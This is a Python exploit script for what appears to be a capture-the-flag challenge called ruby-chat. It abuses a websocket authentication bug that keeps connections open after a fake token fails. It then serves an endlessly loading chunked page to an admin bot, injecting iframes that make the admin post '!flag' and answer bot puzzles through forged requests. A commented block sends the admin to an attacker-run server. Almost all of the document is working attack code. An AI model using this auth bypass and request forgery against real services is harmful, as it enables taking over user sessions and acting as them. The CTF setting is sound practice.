"""
TL;DR
The websocket auth scheme has a bug, allowing connections with failed authentication attempts
to stay open.
We will use `TransferEncoding: chunked` to create an infinitely loading page to interact with
the chat without using javascript.
"""
import asyncio
import json
import re
import datetime
from contextvars import ContextVar

import websockets

sendQueue = ContextVar("sendQueue")


def make_msg(text):
    length = hex(len(text))[2:] + "\r\n"
    return (length + text).encode()


async def post_to_chat(msg):
    await sendQueue.get().put(
        f'<div><iframe src="http://localhost:1024/chat/rubychat/post?publicid=1&name=Admin&channel=&message={msg}"></iframe><div>'
    )


async def handle_client(reader, writer):

    print("Client connected.")

    resp = [
        b"HTTP/1.0 200 OK",
        b"Server: SimpleHTTP/0.6 Python/3.9.7",
        b"Content-type: text/html; charset=utf-8",
        b"TransferEncoding: chunked",
        b"",
        make_msg("<p> Hi </p>"),
        b"",
    ]

    writer.write(b"\r\n".join(resp))
    await writer.drain()

    await post_to_chat("!flag")

    while True:
        msg = await sendQueue.get().get()

        print("Sending msg:", msg)
        writer.write(make_msg(msg) + b"\r\n")
        await writer.drain()


async def main():
    sendQueue.set(asyncio.Queue())

    server = await asyncio.start_server(handle_client, '0.0.0.0', 9000)

    url = "ws://localhost:1024/chat/websocket?version=3&channel="
    url = "wss://b752042b7d61abeed942ec55-ruby-chat.challenge.master.cscg.live:31337/chat/websocket?version=3&channel="

    async with websockets.connect(url, origin="localhost") as ws, server:
        await server.start_serving()

        await ws.send(json.dumps(dict(type="auth", token="faketoken", uid="fakeuid")))

        while True:
            print("Waiting for msg ..")
            message = await ws.recv()

            try:
                msg = json.loads(message)
            except json.JSONDecodeError:
                print("Decode Error:", msg)
                continue

            print(msg)
            if msg.get("bottag", None) == 1:
                timestamp = datetime.datetime.strptime(msg["date"], "%Y-%m-%d %H:%M:%S")
                if datetime.datetime.now() - timestamp > datetime.timedelta(hours=2, seconds=5):
                    print("too old ..")
                    continue

                print("BOT BOT")
                m = re.search(r"(\d+) ([|^]) (\d+) =", msg["message"])
                if m:
                    a = int(m.group(1))
                    b = int(m.group(3))

                    if m.group(2) == '|':
                        # s = a | b
                        # TODO: This should be fixed on server maybe??
                        s = a ^ b
                    else:
                        s = a ^ b

                    await post_to_chat(s)


if __name__ == "__main__":
    asyncio.run(main())

"""
# TODO: Trigger that after running the script
import requests

MY_SERVER_URL = "http://172.17.0.1:9000"

print("Triggering admin ..")
resp = requests.post("http://localhost:1024/visit", data={"url": MY_SERVER_URL})
resp.raise_for_status()
"""
